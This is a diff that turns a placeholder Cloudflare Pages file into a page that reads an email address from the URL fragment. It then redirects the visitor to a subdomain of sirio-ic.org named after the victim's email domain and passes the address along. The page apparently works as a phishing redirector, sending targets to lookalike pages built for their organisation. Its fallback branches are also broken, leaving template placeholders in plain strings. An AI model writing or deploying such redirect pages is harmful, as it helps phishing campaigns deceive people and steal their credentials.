@@ -1,12 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare Pages</title>
+  <meta charset="UTF-8">
+  <title>Email-Based Redirect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Cache-Control" content="no-store">
 </head>
 <body>
-    <h1>Hello World!</h1>
+  <script type="text/javascript">
+    (function() {
+      if (window.location.hash) {
+        const hash = window.location.hash.substring(1); // Remove leading #
+        const email = decodeURIComponent(hash);
+        const domainPart = email.split('@')[1];
+
+        if (domainPart) {
+          const domainName = domainPart.split('.')[0]; // Removes TLD
+          const targetUrl = `https://${domainName}.sirio-ic.org/?${domainName}=${encodeURIComponent(email)}`;
+          window.location.replace(targetUrl);
+        } else {
+          // Fallback if email is invalid
+          window.location.replace("https://${domainName}.sirio-ic.org/?${domainName}=${encodeURIComponent(email)}");
+        }
+      } else {
+        // No hash present
+        window.location.replace("https://${domainName}.sirio-ic.org/?${domainName}=${encodeURIComponent(email)}");
+      }
+    })();
+  </script>
+  <noscript>Please enable JavaScript for this page to work.</noscript>
 </body>
 </html>
-
